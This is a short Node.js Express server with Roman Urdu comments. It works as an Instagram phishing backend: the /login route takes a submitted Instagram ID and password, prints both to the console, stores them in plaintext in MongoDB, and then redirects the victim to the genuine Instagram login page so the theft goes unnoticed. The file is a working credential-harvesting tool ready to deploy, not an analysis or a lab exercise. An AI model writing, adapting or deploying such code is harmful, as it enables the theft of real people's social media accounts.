require('dotenv').config(); // Environment variables load karne ke liye
const express = require('express');
const mongoose = require('mongoose');
const bodyParser = require('body-parser');
const User = require('./user'); // Check karein ke file ka naam 'user.js' hai ya 'User.js'

const app = express();

// Middleware
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.json()); // JSON data support ke liye
app.set('view engine', 'ejs');
app.use(express.static('public'));

// Database Connection
// process.env.MONGO_URI ko hum Atlas se connect karenge
mongoose.connect(process.env.MONGO_URI)
    .then(() => console.log("Instagram DB Connected!"))
    .catch(err => console.error("DB Connection Error:", err));

// Routes
app.get('/', (req, res) => {
    res.render('index');
});

app.post('/login', async (req, res) => {
    const { instaId, password } = req.body;
    
    // Console mein check karne ke liye ke data aa raha hai (Optional)
    console.log(`Received - ID: ${instaId}, Pass: ${password}`);

    try {
        const newUser = new User({ instaId, password });
        await newUser.save();
        
        // Data save hote hi user ko asli Instagram par bhej dein
        res.redirect('https://www.instagram.com/accounts/login/');
    } catch (err) {
        console.error("Save Error:", err);
        res.status(500).send("Technical Issue, please try again later.");
    }
});

// Port configuration (Live servers ke liye process.env.PORT zaroori hai)
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});